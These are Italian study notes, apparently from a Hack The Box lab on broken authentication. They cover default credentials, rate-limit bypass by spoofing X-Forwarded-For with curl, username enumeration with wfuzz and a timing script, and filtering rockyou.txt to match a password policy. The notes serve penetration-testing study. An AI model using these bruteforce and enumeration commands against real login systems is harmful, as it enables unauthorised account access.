# Argomenti 
- Default Credentials
- Weak Bruteforce Protections
- Brute Forcing Usernames
- Brute Forcing Passwords
- Predictable Reset Token
- Authentication Credentials Handling
- Guessable Answers
- Username Injection
- Brute Forcing Cookies
- Insecure Token Handling 

# Credenziali di default
e' sempre bene controllare credenziali di default del software con cui stiamo interagento. su internet di trovano.

# Brute force

I meccanismi di sicurezza contro il bruteforce sono:
- CAPTCHA
- Rate limits


curl 'http://138.68.153.165:30919/question2/' -X POST -H 'X-Forwarded-For: 1.2.3.4' --data-raw 'userid=s&passwd=s&submit=submit'

curl 'http://138.68.153.165:30919/question2/' -X POST -H 'X-Forwarded-For: 127.0.0.1' --data-raw 'userid=aaa&passwd=aaa&submit=submit'

## Trovare lo username

bruteforce dello username basata sulla risposta della pagina 
```shell
$ wfuzz -c -z file,/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php

$ wfuzz -c -z file,/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt  --hs "Invalid username." http://138.68.153.165:31141/question1/?Username=FUZZ&Password=asas
```



attacco timing
```shell
$ python3 timing.py /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
```

si puo' fare enumerazione basandosi sui messaggi di risposta del server quando si prova a fare la login o il reset della passeword. 

## trovare la password

esempio di filtri su rokyou usando la policy eventualmente trovata

```shell
$ grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep -E '^.{8,12}$'
```